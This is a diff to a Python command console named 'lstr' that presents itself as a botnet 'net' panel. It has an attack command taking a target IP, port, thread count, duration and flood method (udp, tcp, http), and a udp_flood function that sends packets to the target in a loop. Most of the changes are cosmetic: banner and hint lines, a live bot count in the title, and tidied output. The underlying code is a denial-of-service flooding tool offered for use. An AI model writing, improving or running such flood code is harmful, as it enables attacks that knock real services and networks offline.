@@ -1,3 +1,8 @@
+#!/usr/bin/env python3
+# ================================================
+# lstr – STOL3N/MEV NET CONSOLE (RED/WHITE ONLY)
+# ================================================
+
 import os, sys, socket, threading, random, time, struct
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
@@ -23,16 +28,21 @@ BANNER = f"""{R}
       / /  | |  ___  | |_   _ __ 
      / /   | | / __| | __| | '__|
     / /    | | \__ \ | |_  | |   
-   /_/     |_| |___/  \__| |_|    
+   /_/     |_| |___/  \__| |_|   
+  
+{W} >>> {TOOL_NAME.upper()} NET <<<{C}
+"""
 
-   
-{W}         >>> {TOOL_NAME.upper()} NET <<<{C}
+# ---------- HINT LINES (kept after every clear) ----------
+HINTS = f"""{W}>> type {R}help{C} for commands
+>> type {R}methods{C} to see all methods
+>> type {R}plan{C} to see your plan
 """
 
 # ---------- DYNAMIC TITLE ----------
 def set_title():
     status = "ONLINE" if ATTACK_RUNNING else "IDLE"
-    title = f"lstr Net - Bots: 3 - Admin"
+    title = f"lstr Net - Bots: {ACTIVE_BOTS} - Admin"
     if os.name == 'nt':
         os.system(f'title {title}')
     else:                               # Linux/macOS
@@ -56,7 +66,7 @@ def udp_flood(ip, port, duration):
             sock.sendto(payload, (ip, port))
             sent += 1
             if sent % 5000 == 0:
-                print(f"{W}[UDP] {sent:,} → {ip}:{port}{C}")
+                print(f"{W}[UDP] {sent:,} to {ip}:{port}{C}")
         except:
             pass
     print(f"{W}[UDP] Sent {sent:,} packets.{C}")
@@ -98,20 +108,20 @@ COMMANDS:
   {R}plan{C}     – your access info
   {R}attack{C} <ip> <port> <threads> <sec> <method>
   {R}stop{C}     – stop current attack
-  {R}clear{C}    – clear screen
+  {R}clear{C}    – clear screen (keeps banner & hints)
   {R}exit{C}     – quit
 {W}""")
 
 def cmd_methods():
-    print(f"{W}METHODS: {R}udp  tcp  http{C}")
+    print(f"{W}METHODS: {R}udp tcp http{C}")
 
 def cmd_plan():
     print(f"""{W}
 PLAN:
-  User  : {R}{USER.upper()}{W}
-  Bots  : {R}{ACTIVE_BOTS:,}{W}
-  Time  : {R}{datetime.now().strftime('%H:%M:%S')}{W}
-  Status: {R}{'ONLINE' if ATTACK_RUNNING else 'IDLE'}{W}
+  User   : {R}{USER.upper()}{W}
+  Bots   : {R}{ACTIVE_BOTS:,}{W}
+  Time   : {R}{datetime.now().strftime('%H:%M:%S')}{W}
+  Status : {R}{'ONLINE' if ATTACK_RUNNING else 'IDLE'}{W}
 {W}""")
 
 def launch_attack(ip, port, threads, duration, method):
@@ -123,7 +133,7 @@ def launch_attack(ip, port, threads, duration, method):
         print(f"{R}[!] Unknown method: {method}{C}")
         return
 
-    print(f"{W}[+] {R}{method.upper()}{W} → {R}{ip}:{port}{W} | {R}{threads}{W} threads | {R}{duration}s{C}")
+    print(f"{W}[+] {R}{method.upper()}{W} to {R}{ip}:{port}{W} | {R}{threads}{W} threads | {R}{duration}s{C}")
     ATTACK_RUNNING = True
     set_title()
 
@@ -154,12 +164,11 @@ def cmd_stop():
 # MAIN LOOP
 # ========================================
 def main():
+    # Full clear only once at start
     os.system('cls' if os.name == 'nt' else 'clear')
     print(BANNER)
+    print(HINTS)
     set_title()
-    print(f"{W}>> type {R}help{C} for commands\n")
-    print(f"{W}>> type {R}methods{C} to see all methods\n")
-    print(f"{W}>> type {R}plan{C} to see your plan\n")
 
     while True:
         try:
@@ -175,8 +184,10 @@ def main():
             elif action == "plan":
                 cmd_plan()
             elif action == "clear":
+                # *** ONLY CLEAR OUTPUT, KEEP BANNER + HINTS ***
                 os.system('cls' if os.name == 'nt' else 'clear')
                 print(BANNER)
+                print(HINTS)
                 set_title()
             elif action == "attack" and len(cmd) == 6:
                 try:
